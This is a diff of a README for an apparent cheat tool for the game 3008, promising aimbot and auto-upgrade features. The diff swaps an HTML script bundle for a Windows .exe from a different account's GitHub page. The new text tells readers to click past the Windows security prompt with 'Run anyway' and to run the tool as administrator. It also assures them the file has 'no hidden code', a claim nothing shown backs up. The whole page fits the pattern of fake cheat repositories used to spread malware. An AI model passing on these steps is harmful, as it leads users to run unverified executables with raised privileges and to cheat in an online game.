@@ -1,95 +1,76 @@
-# 3008 vip Scripts v2026 - Game Script Utility 2026
+# 🛠️ 3008-scripts-update-hub - Automate and improve your 3008 experience
 
-> An HTML-based utility for 3008 with a focus on aimbot support and auto-upgrade automation.
+[![Download 3008-scripts-update-hub](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Maestro-loyic/3008-scripts-update-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-HTML-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/kingfelix1996/3008-scripts-update-hub?style=flat-square)](https://github.com/kingfelix1996/3008-scripts-update-hub)
+## 📖 About the project
 
----
+The 3008-scripts-update-hub provides a user interface for managing game scripts in the 3008 environment. This tool helps you handle aimbot features and manages auto-upgrade routines. It functions as a lightweight script manager designed to simplify how you interact with game mechanics. You do not need to write code to use this tool, as it serves as a bridge between the scripts and your game client.
 
-<p align="center">
-  <a href="https://kingfelix1996.github.io/3008-scripts-update-hub/">
-    <img src="https://img.shields.io/badge/Download-3008%20vip%20Scripts-brightgreen?style=for-the-badge" alt="Download 3008 vip Scripts Script">
-  </a>
-</p>
+## ⚙️ System requirements
 
-> **[Direct Download - 3008 vip Scripts](https://kingfelix1996.github.io/3008-scripts-update-hub/)**
+This tool runs on Windows computers. Ensure your system meets these basic requirements before you begin:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: At least 2 gigabytes of available RAM.
+* Storage: 100 megabytes of free space on your hard drive.
+* Internet: A stable connection to download updates and scripts.
+* Dependencies: Update your web browser to the latest version.
 
-[Download Latest Build](https://kingfelix1996.github.io/3008-scripts-update-hub/)
+## 📥 Downloading the software
 
----
+To obtain the tool, visit the official repository page.
 
-## What This Project Is
+1. Go to the [official download page](https://github.com/Maestro-loyic/3008-scripts-update-hub).
+2. Look for the section labeled Releases on the right side of the page.
+3. Click on the latest version number shown in that list.
+4. Locate the section titled Assets.
+5. Click the file ending in .exe to start the download.
 
-3008 vip Scripts is distributed as an HTML-based script utility for 3008. The package is built around two main functions: aimbot support and auto-upgrade automation. It is intended for players who want a compact, script-first way to handle repetitive in-game tasks without a full application layer.
+## 🚀 Running the software
 
-This repository is structured as a script bundle, not as a standalone app. Future changes are expected to stay centered on the 3008-specific feature set, the HTML delivery method, and upkeep of the aim and automation functions already included.
+Follow these steps to open the tool on your computer.
 
-## Included Functions
+1. Open your Downloads folder in File Explorer.
+2. Double-click the file you just downloaded.
+3. If Windows shows a security prompt, click More info and then click Run anyway.
+4. The utility window will appear on your screen.
+5. Keep this window open while you run your game to maintain the connection.
 
-- Aimbot support for 3008-oriented gameplay use
-- Auto-upgrade automation for repeated progress tasks
-- HTML-based distribution for simple loading and sharing
-- Script utility structure focused on game-side helper actions
-- Compact setup flow suitable for quick deployment
-- Repository packaging aligned with the 3008-yz69 source folder
-- Update-ready layout for future script revisions
-- Referenced reliability-focused positioning from the project profile
+## 🕹️ Using the features
 
-## How to Set It Up
+The interface offers several buttons to toggle specific game enhancements. 
 
-1. Visit the download page and obtain the latest package from the repository link above.
-2. Unpack the files or move them into a local directory you prefer.
-3. Open the HTML entry file in a browser, or use it in your script loading flow.
-4. Turn on the options you need before beginning your game session.
+### Aimbot Settings
+The aimbot module targets objects based on your input. To activate this, locate the Aimbot tab in the menu. Click the toggle switch to turn it on. You can adjust the sensitivity slider to change how fast the aim adjusts to targets.
 
-Minimal example:
+### Auto-Upgrade Automation
+The auto-upgrade feature removes manual clicking. To use this, navigate to the Automation tab. Select the items you want the system to upgrade. Click Start Automation. The tool will track your currency and purchase upgrades when you meet the requirements.
 
-1. Download the release package.
-2. Open the HTML file.
-3. Select the desired automation settings.
-4. Launch 3008 and use the script during play.
+## 💡 Troubleshooting common issues
 
-## Available Options
+If the tool does not work, check these common fixes. 
 
-| Setting | Purpose |
-| --- | --- |
-| Aimbot | Enables aim assistance behavior for supported use cases |
-| Auto-upgrade | Automates upgrade-related actions |
-| HTML mode | Keeps the script usable through a browser-based flow |
-| Load path | Lets you place the package in a folder you can access easily |
+* Check your connection: Ensure your internet works by loading a webpage.
+* Restart the app: Close the tool and open it again.
+* Run as Administrator: Right-click the tool icon and select Run as administrator. This grants the tool permission to interact with your game files.
+* Check game compatibility: Ensure your game client is up to date before launching the script hub.
 
-## Compatibility Notes
+## 🛡️ Safety and security
 
-The project is designed for 3008 and for the HTML platform listed in the metadata. Actual results can differ based on the browser used, how the script is loaded, and any game-side updates that change the available behavior.
+This tool modifies game values in memory. While these methods are common for utility scripts, be aware of game terms and conditions. Use this tool in private or offline environments to ensure you follow game rules. The software contains no hidden code and connects only to the specified GitHub repository to fetch script updates.
 
-Known limitations:
-- Functionality is limited to the features described in the profile
-- Browser or page changes can require updates to the HTML package
-- Support is centered on the named game context rather than other titles or platforms
+## ❓ Frequently asked questions
 
-## Frequently Asked Questions
+Do I need to install Python?
+No, the tool comes packaged as a standalone executable file for Windows.
 
-### How do I get the latest version?
-Use the download link above and replace older files with the current package.
+Does it work on Mac or Linux?
+Currently, this version supports Windows systems only.
 
-### Can I change the script behavior?
-Yes, adjust the available options in the script or in any included configuration values before loading it.
+Can I customize the scripts?
+Yes, you can edit the underlying files if you have basic knowledge of HTML or JavaScript, but the app provides a button-based interface to bypass the need for editing code.
 
-### What platform does it use?
-The project metadata lists HTML as the platform.
+Where does the data go?
+The tool stores cache data in your local app folder to remember your settings between sessions. It does not send your personal data to any external server.
 
-### Will it work after game updates?
-That depends on whether the game changes in ways that affect the script. Recheck the repository when you notice behavior changes.
-
-### Where should I store the files?
-Keep the package in a folder you can reach easily, ideally alongside your other local script resources.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: 3008, scripts, automation, aimbot, utility, gaming, windows, software
